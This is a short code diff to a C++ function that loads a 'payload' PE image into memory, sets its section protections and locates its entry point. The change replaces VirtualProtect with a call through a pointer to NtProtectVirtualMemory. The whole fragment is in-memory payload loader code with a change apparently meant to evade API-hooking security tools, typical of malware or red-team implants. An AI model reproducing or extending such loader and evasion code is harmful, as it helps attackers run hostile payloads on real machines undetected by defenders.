@@ -596,7 +596,7 @@ void execute(const vector<unsigned char> &payload) {
     PIMAGE_SECTION_HEADER section =  IMAGE_FIRST_SECTION(ntHeaders);
     for(int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++){
         DWORD newProtect = PAGE_NOACCESS;
-        //regionSize = (SIZE_T)section->Misc.VirtualSize;
+        SIZE_T regionSize = (SIZE_T)section->Misc.VirtualSize;
         void* sectionAddress = (BYTE*)execMemory + section->VirtualAddress;
 
         // Had issues with entry point not having RX, explicitly setting the .text section just in case
@@ -611,7 +611,8 @@ void execute(const vector<unsigned char> &payload) {
             newProtect = PAGE_READONLY;
         }
 
-        VirtualProtect((BYTE*)execMemory + section->VirtualAddress, section->Misc.VirtualSize, newProtect, &oldProtect);
+        //VirtualProtect((BYTE*)execMemory + section->VirtualAddress, section->Misc.VirtualSize, newProtect, &oldProtect);
+        NTSTATUS status = pNtProtectVirtualMemory(CURRENT_PROCESS_HANDLE, &sectionAddress, &regionSize, newProtect, &oldProtect);
     }
 
     void* entryPoint = (void*)((BYTE*)execMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
